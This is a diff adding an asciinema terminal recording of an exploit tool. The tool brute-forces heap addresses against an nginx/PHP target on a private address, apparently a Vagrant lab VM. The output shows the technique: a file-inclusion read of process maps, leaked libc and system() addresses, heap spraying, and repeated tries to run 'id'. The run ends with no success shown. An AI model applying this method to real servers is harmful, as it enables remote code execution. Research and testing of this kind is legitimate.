@@ -1,0 +1,13 @@
+{"version":3,"term":{"cols":80,"rows":24},"timestamp":1779312801,"command":"python3 tools/maps_only_bruteforce_exploit.py --target 192.168.1.205:19321 --cmd id --max-candidates 2000 --progress-every 100 --proof-delay 0.1 --recovery-timeout 20 --time-budget 3600","title":"maps-only Vagrant brute-force campaign ptrace_scope=1","env":{"SHELL":"/opt/homebrew/bin/fish"}}
+[0.049, "o", "target        192.168.1.205:19321\r\nprimitive     LFI maps/libc + marker proof; no /proc/<pid>/mem; no core parsing\r\nptrace rule   target OS ptrace policy is not changed by this tool\r\ncommand       id\r\n\r\n"]
+[0.029, "o", "[*] profiling heap growth with 20 delayed /spray bodies\r\n"]
+[0.652, "o", "php uid       65534\r\nmaster pid    3044\r\nworker pid    26431\r\nnginx rw      0x55e420b83000\r\nlibc base     0x7fca47a6d000\r\nsystem        0x7fca47abdd70 (offset 0x50d70)\r\n"]
+[0.000, "o", "candidate ranges\r\n  0x55e421058000-0x55e4210db000 0x83000 [heap]\r\n  0x55e420ff3000-0x55e421058000 0x65000 [heap]\r\n\r\n"]
+[0.020, "o", "[*] address_mod=7 scanned=185208 safe_seen=2000 selected=2000\r\n"]
+[0.000, "o", "    try=1 mod=7 addr=0x55e421062127 low=2721 rate=49.50/s\r\n"]
+[130.056, "o", "    try=100 mod=7 addr=0x55e421062f77 low=772f rate=0.77/s\r\n"]
+[131.182, "o", "    try=200 mod=7 addr=0x55e421063977 low=7739 rate=0.77/s\r\n"]
+[130.635, "o", "    try=300 mod=7 addr=0x55e421064777 low=7747 rate=0.77/s\r\n"]
+[130.979, "o", "    try=400 mod=7 addr=0x55e421065177 low=7751 rate=0.76/s\r\n"]
+[131.468, "o", "    try=500 mod=7 addr=0x55e421065b77 low=775b rate=0.76/s\r\n"]
+[69.129, "x", "143"]
